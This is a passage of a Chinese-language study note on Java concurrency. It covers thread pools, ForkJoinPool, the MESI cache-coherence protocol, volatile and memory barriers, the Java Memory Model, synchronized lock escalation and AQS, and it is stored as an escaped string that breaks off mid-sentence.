new ThreadPoolExecutor(10, 20, 60L, TimeUnit.SECONDS, workQueue);new ThreadPoolExecutor(nThreads, nThreads,                                      0L, TimeUnit.MILLISECONDS,                                      new LinkedBlockingQueue&lt;Runnable&gt;());\n\n使用ForkJoinPool类创建线程池\n\n维基百科为工作窃取的介绍：\n在并行计算中，工作窃取是多线程计算机程序的一种调度策略。它解决了在具有固定数量处理器（或内核）的静态多线程计算机上执行动态多线程计算的问题，这种计算可以“生成”新的执行线程。它在执行时间、内存使用和处理器间通信方面都很有效。\n\n从JDK1.8开始，Java增加了创建work-stealing（工作窃取）线程池的方法，ForkJoinPool类就是提供了创建work-stealing线程池的实现。\n使用 ThreadPoolExecutor 构造函数手动创建线程池，可以自定义的线程池参数如下\nprivate ForkJoinPool(int parallelism, //线程池的并发级别                         ForkJoinWorkerThreadFactory factory, //用来创建线程的线程工厂                         UncaughtExceptionHandler handler, // 执行任务时遇到不可恢复的错误而终止的内部工作线程的处理程序                         int mode, //处理任务队列的模式，取值可为FIFO_QUEUE或LIFO_QUEUE                         String workerNamePrefix) //表示线程池中执行任务的线程的名称前缀\n\nForkJoinPool类的使用示例：\nnew ForkJoinPool();new ForkJoinPool(Runtime.getRuntime().availableProcessors());new ForkJoinPool(Runtime.getRuntime().availableProcessors(),                  ForkJoinPool.defaultForkJoinWorkerThreadFactory,                  new Thread.UncaughtExceptionHandler()&#123;\t@Override\tpublic void uncaughtException(Thread t, Throwable e) &#123;\t\t//处理异常\t&#125;&#125;, true);  \n\n使用ScheduledThreadPoolExecutor类创建线程池\nScheduledThreadPoolExecutor类用于创建定时任务线程池。ScheduledThreadPoolExecutor继承了ThreadPoolExecutor类，本质上ScheduledThreadPoolExecutor类的构造方法还是调用了ThreadPoolExecutor类的构造方法，只不过在调用时，传递的阻塞队列的类型是DelayedWorkQueue。\n\n\n线程池执行任务的流程以ThreadPoolExecutor为例，线程池的任务执行流程是：\n\n对于提交到线程池的任务，首先会判断线程池中的线程数是否达到corePoolSize\n如果没有达到，就创建新的线程执行任务\n如果达到了，就判断workQueue是否已满\n如果没满，就添加到workQueue\n如果满了，就判断线程池中的线程数是否达到maximunPoolSize\n如果没有达到，就创建新线程来执行任务\n如果达到了，就执行拒绝执行策略\n\n\n\n\n\n\n\n线程池的拒绝策略以ThreadPoolExecutor为例，如果线程池中的线程数达到了maximunPoolSize，并且workQueue已满，没有空闲的线程，此时如果有任务提交到线程池，就会执行线程池的拒绝策略处理函数handler.rejectedExecution(command, this)。\nThreadPoolExecutor中的handler的类型是RejectedExecutionHandler。\nprivate volatile RejectedExecutionHandler handler;\n\nRejectedExecutionHandler接口有四个实现类，这四个类就是JDK提供的线程池拒绝策略的实现类，如果没有传递该handler参数指定使用的拒绝策略，则默认执行AbortPolicy类的拒绝策略，否则执行传递的类的执行策略。继承RejectedExecutionHandler可以实现自定义的拒绝策略。\n线程池的关闭方式Java 线程池的关闭方式有两种：调用 shutdown() 和 shutdownNow() 方法。\n\n调用 shutdown() 方法\n\nshutdown() 方法会平缓地关闭线程池，即不会中断正在执行的任务，能够处理完阻塞队列中已提交的任务，但不会接收新的任务。\nExecutorService executor = Executors.newFixedThreadPool(10);// 提交任务给线程池执行...// 关闭线程池executor.shutdown();\n\n\n调用 shutdownNow() 方法\n\nshutdownNow() 方法会强制立即关闭线程池，即中断所有正在执行的任务，不会处理阻塞队列中已提交的任务，更不会接收新的任务。\nExecutorService executor = Executors.newFixedThreadPool(10);// 提交任务给线程池执行...// 关闭线程池executor.shutdownNow();\n\n最佳线程数要确定线程池的最佳线程数是根据应用场景确定的，一般可以将程序分为CPU密集型程序和I&#x2F;O密集型程序，对于这两种程序，计算最佳线程数的方法是不同的。\n\nCPU密集型程序\nCPU密集型程序对CPU的资源利用率高，理论最佳线程数&#x3D;CPU核心数，一般会将线程数设为CPU核心数+1，以避免有的线程阻塞浪费CPU资源\n\nI&#x2F;O密集型程序\nI&#x2F;O密集型程序对CPU的资源利用率低，线程数的计算需要考虑I&#x2F;O操作的CPU占用率，理论上最佳线程数&#x3D;CPU核心数 * (1 + I&#x2F;O操作的耗时&#x2F;CPU计算的耗时)\n\n\n通过上述方式计算出的线程数只是理论上的最佳线程数，在实际中，需要对系统进行压测，并根据压测结果确定最佳线程数。\nXXX程进程和线程\n进程：操作系统分配资源的基本单位\n\n线程：操作系统执行的基本单位，可以通俗的理解为程序不同的执行路径\n\n\n协程（纤程）协程（Coroutine）是Linux中的概念，对应的纤程（Fiber）是Windows中的概念，实现思路大致相同。\n协程，是一种用户态的轻量级线程，协程的调度完全由用户控制（也就是在用户态执行）。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到线程的堆区，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，所以上下文的切换非常快。\n超线程超线程（Hyper-Threading）是Intel公司引入的一种处理器（CPU）技术。这项技术的主要目标是提高处理器核心的效率和性能。超线程通过使单个处理器核心模拟出两个“逻辑”核心，以便同时处理两个线程，从而提高了处理器的并行处理能力。\n传统的单核心处理器在任何时刻只能处理一个线程。但是，由于各种原因（例如，等待数据从内存中加载），处理器可能无法始终保持忙碌状态。在这些情况下，处理器的一部分（例如，算术逻辑单元或浮点单元）可能会闲置，从而造成资源浪费。\n超线程技术试图解决这个问题，通过在单个核心上同时运行两个线程，使得当一个线程在等待时，另一个线程可以使用处理器的资源进行计算。因此，超线程可以使处理器在相同的时间内完成更多的工作，从而提高处理器的整体效率和性能。\n然而，超线程并不总是能提供显著的性能提升。在某些情况下，如果两个线程需要使用相同的处理器资源，那么它们可能会相互竞争，从而导致性能下降。此外，超线程对于多线程程序或多任务环境最有效，对于单线程程序或单任务环境的效果可能不明显。\n请注意，虽然超线程可以提高处理器的并行处理能力，但它并不能取代多核处理器。多核处理器具有多个独立的物理核心，每个核心都可以处理自己的线程，因此它们通常可以提供比超线程更好的并行性和性能。\n并发编程相关的概念临界区\n临界区表示可以被多线程共享的资源，但是每次只能提供给一个线程使用\n在并发编程中，临界区指的是受保护的对象或程序代码段\n\n操作系统的互斥量用户态、内核态同步和异步\n以同步方式调用方法时，必须在方法返回结果之后才能执行后面的操作\n以异步方式调用方法时，不需要等方法返回信息就可以执行后面的操作，当方法完成后，会以通知或回调的方式告诉调用方\n\n死锁、饥饿、活锁\n死锁指两个或多个线程在执行过程中互相等待对方释放资源的情况，导致彼此无法继续执行；\n饥饿指某个线程由于无法获得所需资源而一直无法执行；\n活锁指两个或多个线程由于某些条件发生变化，导致彼此不断地改变自己的状态和行为，但始终无法向前推进。\n\n死锁形成死锁的必要条件\n互斥条件：资源只能被一个线程占有\n不可剥夺条件：线程占有的资源不能被其他线程强行撤销\n请求与保持条件：如果线程已经占有了一个资源，有需要抢占新资源，而该新资源已经被其它线程占有时，那么抢占新资源的线程会阻塞等待，不会释放自己已经占有的资源\n循环等待条件：发生死锁时，必然存在一个线程与资源的循环等待链，链中的线程请求的资源被下一个线程占有\n\n死锁的预防\n死锁的预防是破坏死锁形成的条件，而互斥条件不能被破坏，因为使用锁的目的就是要保证这一点。\n破坏不可剥夺条件：让当前线程主动释放锁，JVM内置的synchronized锁不能实现这一点，JDK的Lock锁可以实现。使用方法是，通过tryLock()方法加锁，并在finally代码块中调用unlock()方法释放锁。\n破坏请求与保持条件：一次性申请线程所需的全部资源，再运行过程中不再请求新的资源。\n破坏循环等待条件：按照一定的顺序申请资源，实现方法是为每一个资源分配一个唯一编号，每次申请资源时都按照一定的顺序加锁，比如每次都先对编号较小的资源加锁。\n\n自旋锁自旋锁是指线程在获取锁失败后，不会立即进入阻塞状态，而是继续不断尝试获取锁\n原子性、可见性、有序性\n原子性\n原子性操作和数据库中的事务类似\n造成原子性问题的根本原因是在线程执行过程中发生了线程切换\n\n可见性\n可见性是指一个线程修改共享变量，其他线程能够立即读取到共享变量的最新值\n造成可见性问题的根本原因是CPU的缓存机制\n\n有序性\n有序性指程序能够按照代码的顺序执行，不会发送乱序执行\n一个典型的有序性问题是使用双重监测机制创建单例对象（DCL单例），如果在多线程情况下创建单例对象发送乱序执行就可能产生bug\n\n\n解决方法：\n\n原子性：Java中解决原子性问题的方案是使用synchronized锁、Lock锁、ReentrantLock、ReentrantReadWriteLock锁、CAS操作或原子类等。\n可见性：使用缓存一致性协议\n有序性：禁止指令重排\n\n原子性核心原理总线锁保证原子性多核CPU对内存中的一个共享变量值进行加1操作不是原子操作，这是因为在CPU中对值加1的操作有三步（设被加1的数叫count）：\n\n将内存中的count值读取到寄存器。\n对寄存器中的count值进行加1操作。\n将寄存器中的count值写回内存。\n\n如果要保证这三步的原子性，就要保证在CPU1执行这三步的时候，其他CPU不能读写这个共享变量的内存。CPU可以通过对总线加锁来解决这个问题。\n在Linux系统中，锁定总线的指令是lock前缀指令。该指令可以与其他指令组合使用，例如lock add、lock cmpxchg、lock xchg等，用于实现原子性操作。\nlock前缀指令会将总线置为锁定状态，以确保对内存的访问具有原子性和互斥性。当一个CPU执行带有lock前缀的指令时，它将先发送请求到总线，获取总线的独占控制权，然后执行相关的操作并释放总线控制权。由于总线只能被一个CPU独占，因此其他CPU在访问内存时会被阻塞，直到当前CPU执行完成。\n总线锁定会导致其他CPU核心跟所有内存之间的通信全部阻塞，开销极大，而输出LOCK#信号的CPU核心可能只需要使用内存中的很小一部分空间，会造成资源的浪费。\n互斥锁保证原子性互斥锁是一种显式地获取和释放锁的方式，当一个线程尝试获取互斥锁时，如果该锁已经被其他线程占用，那么当前线程就会被阻塞。\n互斥锁模型：\n\n对保护临界区资源的锁对象加锁\n进入临界区代码执行\n对锁对象进行解锁\n\nCAS保证原子性CAS底层使用的操作系统原语是lock cmpxchg\n可见性和有序性核心原理缓存一致性由于CPU的多级缓存架构，引入了数据的不一致问题\nCPU的缓存一致性要求CPU内部缓存中的数据和主内存中的数据一致\n缓存一致性的特点：每个读操作所返回的值必须是最后一次对该存储位置的写操作的值。\nMESI协议CPU通过缓存一致性协议（如MESI协议、MSI协议等）来保证缓存一致性\nMESI协议的每一个字母都是一种一种状态的简称\n\nM：Modify\n处于M状态的缓存行的特点是：\n\n缓存行数据被本地写（当前CPU核心修改缓存行数据），缓存行中的数据和主内存中的数据不一致\n数据只在当前CPU核心的缓存中存在\n处于M状态的缓存行中的数据必须在其他CPU核心读取主内存的数据之前写回主内存\nM状态的缓存行数据被写回主内存后，当前缓存行的状态会被标记为E\n\n\nE：Exclusive\n处于E状态的缓存行的特点：\n\n缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效\n数据只在当前CPU核心的缓存中存在\n处于E状态的缓存行的数据如果被其他的CPU核心读取，会变成S状态\nE状态的缓存行数据被修改后，当前缓存行的状态会被标记为M\n\n\nS：Shared\n处于S状态的缓存行的特点是：\n\n缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效\n数据存在于多个CPU核心的缓存\n处于S状态的缓存行的数据如果发生本地写，会变成M状态\n处于S状态的缓存行的数据如果发生远程写（其他CPU核心修改缓存行数据），会变成I状态\n\n\nI：Invalid\n处于I状态的缓存行的特点是：\n\n处于I状态的缓存行无效\n处于M、E或S状态的缓存行数据，如果发生远程写，则这些缓存行状态都会改为I状态\n\n\n\nMESI存在的问题：\n\nMESI协议在高并发场景下可能会存在问题，原因是在MESI协议下，如果当前CPU需要其他的CPU缓存行改变状态，会发送RFO（Request For Owner）请求进行通知，请求到达其他的CPU是需要时间的，在高并发场景下状态的修改可能会不及时。\n\nM状态的缓存行数据不会立即更新到主内存，可能会导致其他CPU缓存行中读取的数据和修改后的数据出现短暂的不一致，\n这一问题可以通过加锁或volatile解决。\n\n存在伪共享问题。伪共享问题产生的原因是，CPU进行缓存和主内存交换数据的单位是缓存行（目前主流CPU缓存行的大小是64bytes），MESI协议也是针对缓存行变更状态，不是单个数据的状态。一个缓存行可能会存储了多个不同数据，所以缓存行中不同数据的状态存在共享的可能（伪共享），会导致不同数据的缓存状态彼此干扰。\nJDK8之前可以通过字节填充的方式解决伪共享问题，思路大致是在创建变量时，用其他字段填充当前变量所在的缓存行，避免同一个缓存行内存放多个数据变量。\nJDK8中引入了@Contended注解来自动填充缓存行，@Contended注解可以用在类和成员变量上，加上@Contended注解后JVM会自动填充，避免出现伪共享问题。使用@Contended注解需要注意的问题是，@Contended只能用在Java自身的核心类中，如果要用在自己写的类里面，需要添加JVM参数-XX:RestrictContended，此外，@Contended默认的填充宽度是128bytes，如果需要自定义宽度需要配置JVM的-XX:ContendedPaddingWidth参数。\n\n\nvolatile核心原理volatile在内存语义上有两个作用：\n\n保证被volatile修饰的共享变量对每个线程都是可见的（可见性）\n禁止指令重排（有序性）\n\nvolatile不支持原子性，非线程安全\n保证可见性的核心原理volatile能够保证共享变量的可见性，如果一个共享变量使用volatile修饰，则共享变量所在的缓存行会被要求进行一致性校验，当一个线程修改了volatile修饰的共享变量后，修改后的共享变量值会立即刷新到主内存（MESI协议不会立即刷新，而是等远程读或远程写才会将修改后的数据值刷新到主内存）。\n保证有序性的核心原理volatile禁止指令重排是通过内存屏障（Memory Barrier）实现的。\n内存屏障的底层是CPU指令。这个指令有两个作用：\n\n强制刷新缓存，保证共享变量的可见性\n强制刷新缓存是指将处理器的缓存中的数据立即写回到主内存。当处理器修改了某个内存地址的值时，为了确保其他处理器能够看到最新的值，处理器会将修改后的值先写入自己的缓存中，然后再定期将缓存中的数据刷新回主内存。但是有时候我们需要立即刷新缓存，以确保其他处理器能够尽快看到最新的值。这可以通过执行一个写屏障或者其他特定的指令来实现。\n\n禁止指令重排，保证指令的执行顺序\n处理器为了提高程序执行效率，在编译（编译器重排序）或运行（CPU重排序）时会针对代码中的语句进行优化和重排。然而，在多线程并发环境下，这种重排可能会导致一些共享变量的状态无法正确传递，从而出现数据不一致的情况。内存屏障可以禁止指令重排，确保程序执行顺序的正确性。\n注：\n\n编译器重排序：在代码编译阶段为了提高程序的执行效率，但不改变程序执行结果的重排序。\nCPU重排序：CPU按照as-if-serial原则进行指令级重排序和内存系统重排序。as-if-serial原则能够保证在单线程环境下程序执行的正确性，不能保证在多线程环境下程序执行结果的正确性。\n\n\n\nvolatile禁止指令重排序的规则：\n\n\n\n是否能重排序\n第二个操作\n\n\n\n\n\n第一个操作\n普通读或写\nvolatile读\nvolatile写\n\n\n普通读或写\n是\n是\n否\n\n\nvolatile写\n是\n否\n否\n\n\nvolatile读\n否\n否\n否\n\n\n可以总结出规则是：\n\n当第一个操作是volatile读，无论第二个操作是什么，都不能重排序（读操作禁止重排序之后的操作）\n当第一个操作是volatile写，第二个操作是volatile读，不能重排序\n当第二个操作是volatile写，无论第一个操作是什么，都不能重排序（写操作禁止重排序之前的操作）\n\n内存屏障的类型：\n\nLoadLoad屏障：禁止前面的读（Load）和后面的Load重排\nLoadStore屏障：禁止前面的Load和后面的写（Store）重排\nStoreStore屏障：禁止前面的Store重排和后面的Store重排\nStoreLoad屏障：禁止前面的Store重排和后面的Load重排\n\nJVM编译器会按照上述规则在程序编译生成的指令中插入内存屏障，规则是：\n\n对于volatile读\n后面插入一个LoadLoad屏障\n后面插入一个LoadStore屏障\n\n\n对于volatile写\n前面插入一个StoreStore屏障\n后面插入一个StoreLoad屏障\n\n\n\nDCL单例DCL（Double Check Lock）单例为什么需要加volatile：\n如果不加volatile，不能避免指令重排序，初始化指令和堆栈建立连接的指令可能会倒换，即可能出现堆栈建立连接发生在初始化指令之前，即\n\n加volatile，没有被重排序的指令执行过程如下\n初始化指令\n堆栈建立连接的指令\n\n\n不加volatile，可能出现的重排序的指令执行过程如下\n堆栈建立连接的指令\n初始化指令\n\n\n\n这就导致在多线程环境下，如果没有使用volatile，假如一个线程正在使用创建对象，并且发生了指令重排序，使得堆栈建立连接的指令发生在初始化指令之前，那么当这条线程恰好执行完堆栈建立连接的指令，还没有执行初始化指令时，有一个新的线程线程执行DCL单例的函数，判断得到栈中已经指向堆中已有的对象，就会执行返回此对象，而此时对象还没有被初始化，此时获取的对象的值仅仅是默认值而不是初始化的值。\nJava内存模型Java内存模型简称JMM，是Java为了解决可见性和有序性问题而指定的一种编程规范。\n主内存：主要对应于Java堆中存储对象实例数据的部分\n工作内存：主要对应于虚拟机栈中的部分区域\nJMM的概念对于线程的工作内存和主内存之间的数据交互，JMM规定了变量从主内存复制到工作内存，以及从工作内存同步到主内存的实现细节。\nJMM规定\n\n所有变量都存储在主内存中，也就是存储在计算机的物理内存中\n每个线程都有自己的工作内存，用于存储线程私有数据\n线程不能直接访问其他线程的工作内存中的数据，只能通过主内存进行数据交互\n当线程需要操作变量时，需要先将主内存中的变量复制到对应的工作内存中\n\nJMM同步数据的八种操作：\n\n\n\n操作\n名称\n目标\n作用\n\n\n\nlock\n加锁\n主内存中的变量\n把主内存中的变量标记为线程独占的状态\n\n\nunlock\n解锁\n主内存中的变量\n释放主内存中锁定的变量，释放后可以被其他线程锁定\n\n\nstore\n存储\n工作内存中的变量\n把工作内存中的变量的值刷新到主内存中，以便随后的write操作使用\n\n\nwrite\n写入\n工作内存中的变量\n把store操作从工作内存中得到的变量写入到主内存的变量中\n\n\nread\n读取\n主内存中的变量\n把主内存中的变量写入到工作内存中\n\n\nload\n载入\n主内存中的变量\n将read操作从主内存中得到的变量值载入工作内存的变量中\n\n\nuse\n使用\n工作内存中的变量\n将工作内存中的变量值传递给执行引擎\n\n\nassign\n赋值\n工作内存中的变量\n执行引擎将值赋值给工作内存中的变量\n\n\nHappens-Before原则在JMM中定义了一套Happens-Before原则，用于保证程序在执行过程中的可见性和有序性。\nHappens-Before原则主要包括以下内容：\n\n程序次序原则\n写在前面的操作先行发生于写在后面的操作\n\nvolatile变量原则\n对一个volatile变量的写操作必然发生在后续对这个变量的读操作之前\n\n传递原则\nABC三个操作，A先于B，B先于C，则A先于C\n\n监视锁规则\n对监视器的加锁发生在解锁之前\n\n锁定原则\n先解锁才能加锁\n\n线程启动原则\n线程start()后才能执行线程中的代码\n\n线程中断原则\n对线程的interrupt()方法的调用发生在中断事件产生之前\n\n线程终结原则\n线程结束后，其他线程能够访问到该线程修改后的共享变量的值\n\n对象终结原则\n一个对象的初始化必然在其finalize()方法之前执行\n\n\nsynchronizedsynchronized用法synchronized用法分三种：\n\n同步实例方法\n当类的普通方法被synchronized修饰时，相当于对this加锁，这个方法被声明为同步方法。\n\n同步静态方法\n当类的静态方法被synchronized修饰时，相当于对这个类的Class对象（.class）加锁，而一个类只对应一个Class对象。\n\n同步代码块\n通过对互不影响的临界区资源分别加锁（可能需要创建锁对象），可以减小对临界区资源的等待，提高程序的执行效率。\n\n\n可以由此将synchronized的锁分成两类锁：\n对象锁：对实例方法和同步代码块加的锁称为对象锁\n类锁：对静态方法加的锁称为类锁\nJava对象结构Java对象结构按照顺序由以下几部分组成：\n\n对象头\nMark Word\n类型指针\n数组长度（仅在当前对象是数组时才会存在）\n\n\n实例数据\n对齐填充\n\n以下是对Java对象组成部分的详细说明（64位JVM下）：\n\n对象头（8 + 4 + 4 &#x3D; 12 + 4 &#x3D; 16字节）\n\nMark Word（8字节）\nMark Word用于存储对象的运行时数据，按照锁状态可以分为以下几类：\n\n无锁：对象的Hash码（31位）、GC的分代年龄（4位）、偏向锁标记（1位）、锁的状态标志（2位）\n偏向锁：偏向锁线程id（54位）、获得偏向锁的时间戳（2位）、GC的分代年龄、偏向锁标记、锁的状态标志\n轻量级锁：轻量级锁指针（指向栈中锁的指针，62位）、锁的状态标志\n重量级锁：重量级锁指针（指向对象监视器的指针，62位）、锁的状态标志\nGC标记（GC标记用于标记可以回收的垃圾对象）：锁的状态标志\n\n\n类型指针（4字节，默认开启压缩，由8字节压缩为4字节）\n类的类元信息存储在JVM的方法区中，对象头的类型指针会指向存储在方法区中的类元信息\n不同位数的JVM中长度不同，在32位JVM中，类型指针占用32位的存储空间，64位JVM中，占用64位。\n\n数组长度（仅在当前对象是数组时才会存在，4字节）\n\n\n\n实例数据\n存储对象的成员变量信息，既包含了类的成员变量值（具体值），也包含了父类的成员变量值\n\n对齐填充\n以满足JVM中对象的起始地址是8的整数倍的要求，所以对象的实例变量占用的存储空间需要是8字节的整数倍\n\n\n使用JOL查看对象结构为了方便查看JVM中对象结构并计算某个对象的大小，OpenJDK提供了一个JOL工具包\n定义了一个int[]数组，并使用JOL提供的方法输出对象信息：\n\n输出的Java对象信息：\n\nsynchronized底层实现JVM是基于JVM中的monitor锁实现的，Java1.5版本之前的synchronized锁性能较低，但是从Java1.6开始，对synchronized锁进行了优化，引入了锁升级、锁粗化、锁消除等技术来提高synchronized的性能。\n\n字节码层面\n\nsynchronized修饰的方法的字节码会比普通方法多一个ACC_SYNCHRONIZED标识符\n\nsynchronized修饰的代码块的字节码会在同步代码块的前后分别添加monitorenter和monitorexit指令\n\n\n\nJVM层面\nsynchronized修饰方法和代码块，在底层实现上没有本质区别\n重量级锁的底层是基于Monitor锁实现的\n\n操作系统层面\n轻量级锁的底层是基于CAS实现的\nMonitor锁是基于操作系统的Mutex锁实现的，Mutex锁是操作系统级别的重量级锁。\n\n\nMonitor锁原理重量级锁的底层是基于Monitor锁实现的，而Monitor锁又是基于操作系统的Mutex锁实现的\n在Java中创建出来的任何一个对象都会关联一个Monitor对象，当Monitor对象被一个Java对象持有后（Monitor对象的owner参数不为空），这个Monitor对象就会处于锁定状态。\n在HotSpot JVM中，Monitor对象是由ObjectMonitor实现的，ObjectMonitor 是JVM中用于实现对象的同步、监视和锁定的重要数据结构。ObjectMonitor的数据结构：\nObjectMonitor() &#123;    _header       = NULL;    _count        = 0; // 记录线程获取锁的次数    _waiters      = 0,    _recursions   = 0;  // 锁的重入次数    _object       = NULL;    _owner        = NULL;  // 指向持有ObjectMonitor对象的线程    _WaitSet      = NULL;  // 处于wait状态的线程，会被加入到_WaitSet    _WaitSetLock  = 0 ;    _Responsible  = NULL ;    _succ         = NULL ;    _cxq          = NULL ;    FreeNext      = NULL ;    _EntryList    = NULL ;  // 处于等待锁block状态的线程，会被加入到该列表    _SpinFreq     = 0 ;    _SpinClock    = 0 ;    OwnerIsThread = 0 ;  &#125;\n\nObjectMonitor的几个关键属性 count、recursions、owner、WaitSet、 EntryList 体现了monitor的工作原理\nsynchronized加锁与解锁在JVM底层的实现流程大致分为以下几步：\n\n被阻塞的线程被封装成ObjectWaiter对象进入_EntryList，获取到锁（获取到Monitor对象）的线程就会被_owner指向，并把ObjectMonitor对象的_count变量值加1。\n\n当线程调用wait()方法时，当前线程会释放持有的ObjectMonitor对象，并把_owner变量值设为NULL，_count变量值减1。\n由于wait()、notify()、notifyAll()等方法在执行过程中会使用ObjectMonitor对象，所以，必须在同步代码块或方法中调用这些方法。\n\n如果获取到ObjectMonitor对象的线程执行完毕，则会释放ObjectMonitor对象，将ObjectMonitor对象中的_count变量值减1（当_count变量值再次为0，当前线程就成功的释放了锁），_owner变量值设为NULL。\n\n\n锁升级的过程锁升级的过程经历以下几个阶段\n\n无锁\n\n偏向锁\n\n轻量级锁（自旋锁）\n\n重量级锁\n\n\nJava锁对象由无锁升级为重量级锁的详细步骤：\n\n线程的抢占锁时首先会检查偏向锁标记位和锁标记位，如果发现是偏向锁，进行锁竞争的一般流程：\n\n线程获取锁：线程会检查Mark Word中的偏向锁线程id是否是自己的线程id\n如果是，则当前线程已经持有了锁，直接执行同步代码\n如果不是，则当前线程会通过CAS自旋的方式尝试将Mark Word中的偏向锁线程id设为自己的线程id\nCAS操作成功，将Mark Word中的偏向锁线程id设为自己的线程id的操作成功\nCAS操作失败，说明此时有其他线程也在争抢锁资源，此时会撤销偏向锁，升级为轻量级锁\n\n\n\n\n\n\n如果发现是轻量级锁，进行锁竞争的一般流程：\n\n将锁对象的 Mark Word 备份到 Displaced Mark Word （当线程被创建后，JVM会在线程的栈帧中创建一个用于存储锁记录（Lock Record）的空间，里面存储了owner和Displaced Mark Word）中，并将栈帧的owner指针指向锁对象\n\n尝试通过 CAS 将锁对象的 Mark Word 更新为指向 Displaced Mark Word 的指针\n\n如果CAS操作成功，表示当前线程成功获取了轻量级锁，并进入临界区执行。\n\n如果已经指向其他线程，竞争锁失败，会进行CAS操作\n\n自旋等待：如果CAS操作失败，表示锁对象已经被其他线程占用。此时，请求锁的线程会进入自旋等待状态。在自旋等待状态下，线程会反复尝试使用CAS操作获取锁，而不会被阻塞。\n\n自旋限制：CAS自旋操作超过一定的次数仍未抢占到锁，轻量级锁会膨胀为重量级锁，进入阻塞状态。\n对于自旋次数上限值，JDK中提供了自适应自旋的方案，如果当前线程的CAS自旋成功，就会增大下一次的自旋次数上限值，如果失败，就会减小。\n\n\n\n\n\n当线程释放锁\n\n如果锁对象还是轻量级锁的状态，当前线程就会使用CAS操作将Displaced Mark Word中存储的信息复制到锁对象的Mark Word中\n如果锁对象已经升级为了重量级锁，当前线程就会释放锁并唤醒其他被阻塞的线程争抢锁\n\n\n\n\n如果发现是重量级锁，进行锁竞争的一般流程：\n\n线程请求锁：当一个线程需要获取重量级锁时，它会向操作系统发送请求。\n如果当前没有其他线程持有锁，请求的线程会成功获取锁，并进入临界区执行。\n\n如果锁已经被其他线程占用，请求的线程将进入阻塞等待状态，线程会被操作系统挂起，不会占用CPU资源。\n\n\n\n\n\n\nJava锁对象由无锁升级为重量级锁的其他途径：\n\n计算一致性哈希\n只要锁对象计算过一致性哈希，偏向模式就置为0了，也就意味着该对象锁不能再偏向了，最低也会膨胀会轻量级锁。如果对象锁处于偏向模式时遇到计算一致性哈希请求，那么会跳过轻量级锁模式，直接膨胀为重量级锁。\n\n\n锁降级重量级锁的降级只会发生在GC期间的STW阶段，只能降级为可以被JVM线程访问，而不被其他Java线程访问的对象。\nAQS核心原理AQS（AbstractQueuedSynchronizer）是volatile和CAS和队列的组合应用\njava中哪些同步锁是基于AQS实现的：\nJava 并发包 java.util.concurrent 中的许多同步工具类都是基于 AbstractQueuedSynchronizer (简称 AQS) 来实现的。AQS 是一个用于构建锁和同步器的框架，它使用一个 int 成员变量来表示同步状态，并提供了一种使用 CAS（Compare-and-Swap）设置同步状态的方式。以下是一些基于 AQS 实现的同步类：\n\nReentrantLock：重入锁，是一种互斥锁，它的特点是支持重入功能，也就是说，一个线程能够对已经获取到的锁再次获取，而不会发生死锁。\n\nReentrantReadWriteLock：读写锁，它分为两个锁，一个是读锁，一个是写锁。多个读锁之间不会互斥，读锁与写锁互斥，写锁与写锁互斥。这是由jvm自己控制的，你只要上好相应的锁即可。\n\nSemaphore：信号量，内部维护了一组”许可”，线程可以申请许可（如果无可用许可则阻塞），也可以释放许可。信号量可用于实现资源池，或者对某个操作的并发线程数进行限制。\n\nCountDownLatch：倒计时门栓，它可以让一个或多个线程等待其他线程完成各自的工作后再执行。\n\nCyclicBarrier：循环栅栏，它允许一组线程互相等待，直到所有的线程都准备就绪后，所有的线程才能继续执行。\n\nFutureTask：一个实现了 Future 和 Runnable 接口的类，可以用来执行 Callable 任务，并且可以获取任务执行后的结果。\n\n\n这些类都通过自定义 AQS 来实现它们自己的同步语义。\nAQS数据结构原理AQS（AbstractQueuedSynchronizer，抽象队列同步器）是Java中提供的一个抽象类，位于java.util.concurrent.locks包下\nAQS的数据结构主要包括以下几个部分：\n\n两类FIFO（先进先出）的双向链表（同步队列和同步条件队列）\n链表中的每个节点都是对线程的封装，如果线程竞争锁失败，就会被封装成一个Node节点加入AQS队列的尾部。当获取锁的线程释放锁之后，会从AQS中唤醒一个被阻塞的线程。\n\n同步队列通过addWaiter()方法添加到队列的尾部，通过acquire()方法退出同步队列\n同步条件队列addConditionWaiter()方法添加到队列的尾部，通过doSignal()方法退出同步队列。AQS中的同步条件队列就是为Lock锁实现的一个基础同步器，只有在使用了Condition时会存在条件队列，并且一个线程可能存在多个条件队列\n\n\n头节点指针、尾节点指针\n头节点指针指向的节点封装的线程会占用资源，同时会通过CAS的方式更新state变量、头&#x2F;尾节点指针的指针的指向。\n\n用来标识状态的volatile修饰的变量state\nAQS中使用getState()方法读取state变量的值，使用setState()（无法保证原子性）和compareAndSetState()方法（能够保证原子性）设置state变量的值\n\nNode类，AQS实现的独占锁和共享锁是在其静态内部类Node中定义的\n静态内部类Node是一个双向链表，节点中保存了当前的状态waitState和当前线程thread。通过SHARED和EXCLUSIVE定义共享或独占状态。\nNode中有四个常量，是waitState变量的取值，waitState变量也是用volatile修饰：\n/** waitStatus value to indicate thread has cancelled */// 表示当前节点中的线程已被取消static final int CANCELLED =  1;/** waitStatus value to indicate successor&#x27;s thread needs unparking */// 表示后继节点中的线程处于等待状态，需要被唤醒static final int SIGNAL    = -1;/** waitStatus value to indicate thread is waiting on condition */// 表示当前节点中的线程在等待某个条件，也就是当前节点处于condition队列中static final int CONDITION = -2;/** * waitStatus value to indicate the next acquireShared should * unconditionally propagate */// 表示在当前场景下能够执行后续的acquireShared操作static final int PROPAGATE = -3;\n\nAQS底层对锁的支持Java中java.util.concurrent包下的大部分工具类的实现都基于AQS（都extends Sync，而Sync extends 